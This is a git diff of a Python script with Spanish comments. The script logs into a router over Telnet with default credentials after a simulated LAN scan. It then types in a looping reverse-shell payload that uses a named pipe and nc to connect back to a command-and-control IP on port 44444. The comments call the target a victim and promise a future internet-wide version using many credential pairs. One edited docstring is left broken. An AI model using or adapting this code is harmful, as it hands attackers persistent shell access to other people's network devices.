@@ -1,19 +1,19 @@
- import subprocess
+import subprocess
 import threading
 import time
 import socket
 
-IP_ROUTER = "192.168.1.1"
-USER      = "user"
+IP_ROUTER = "192.168.1.1"      #En este caso colocaremos la IP de la victima por que es una simulacion , en el escaneo podrias escontrar mas ips, en otro git sera en internet y sera diferente
+USER      = "user"             # las credenciales del modem estan en eese formato por que es una demo, para agilizar la explicacion ,en la version futura y real sera diferente ,20 a 30 credenciales -
 PASSWORD  = "user"
-TU_IP     = "192.168.1.4"      # IP
-TU_PUERTO = "44444"            # puerto
+TU_IP     = "192.168.1.4"      # IP , aqui ira la IP donde esta corriendo el C&C (comand & control) , puedes colocar tu propia maquina como C&C 
+TU_PUERTO = "44444"            # puerto donde estara ala escucha 
 
 
 PAYLOAD = f"killall nc sh 2>/dev/null; rm -f /tmp/p; mknod /tmp/p p; sh -c 'while :;do /bin/sh 0</tmp/p | nc {TU_IP} {TU_PUERTO} 1>/tmp/p 2>/tmp/p || sleep 20;done'&"
 
 def escanear_telnet():
-    """🔍 Simula escanear toda la red /24 pero solo revisa las primeras 10 IPs"""
+    """🔍 sim escanear toda la red /24 , solo "10"   ""
     print("🚀 SCAN MODULE CORRIENDO...")
     print("📡 ESCANEANDO TELNET EN 192.168.1.0/24 (254 hosts)")
     print("🎯 Buscando servicio Telnet en puerto 23...")
@@ -52,7 +52,7 @@ def escanear_telnet():
         time.sleep(0.3)  
     
     
-    print(f"\n⏩ Escaneo rápido completado. Continuando con análisis...")
+    print(f"\n⏩ Escaneo completado. Continuando con análisis...")
     time.sleep(1)
     
     print(f"\n📊 RESUMEN DEL ESCANEO TELNET:")
@@ -72,11 +72,11 @@ def escanear_telnet():
     print("\n" + "="*50)
     return servicios_telnet
 
-# EJECUTAR SCAN TELNET ANTES DEL LOGIN
+# SCAN TELNET ANTES DEL LOGIN
 print("🔄 PREPARANDO CONEXIÓN AL ROUTER...")
 time.sleep(1)
 
-# Ejecutar escaneo Telnet
+# escaneo Telnet
 servicios_telnet = escanear_telnet()
 time.sleep(1)
 
@@ -88,7 +88,7 @@ else:
 
 print(f"🔗 Conectando al router {IP_ROUTER}...")
 
-# Abre Telnet
+# Abre el login Telnet
 p = subprocess.Popen(["telnet", IP_ROUTER],
                      stdin=subprocess.PIPE,
                      stdout=subprocess.PIPE,
@@ -96,7 +96,7 @@ p = subprocess.Popen(["telnet", IP_ROUTER],
                      text=True,
                      bufsize=0)
 
-# Hilo que muestra todo en tiempo real
+# login en vivo
 def lector():
     while True:
         linea = p.stdout.readline()
@@ -121,7 +121,7 @@ for char in PAYLOAD:
     p.stdin.flush()
     time.sleep(0.002)
 
-# Esto es lo que tú hacías a mano: pulsar Enter justo después de pegar
+
 p.stdin.write("\n")
 p.stdin.flush()
 
@@ -129,8 +129,8 @@ time.sleep(0.8)  # el router ejecuta el & y devuelve el prompt en <1 segundo
 
 print("✅ PAYLOAD INYECTADO EN BACKGROUND")
 print("🎯 ¡REVERSE SHELL ACTIVA!")
-print("👉 Ya tienes reverse shell en: nc -lvnp 44444")
-print("🔧 Puedes seguir usando el Telnet normalmente ↓↓↓\n")
+print("👉 Verifiquemos "id" por ejemplo para saber si esta conectado")
+print("🔧 Podemos seguir usando el telnet en la maquina victima ↓↓↓\n")
 
 # Bucle interactivo
 try:
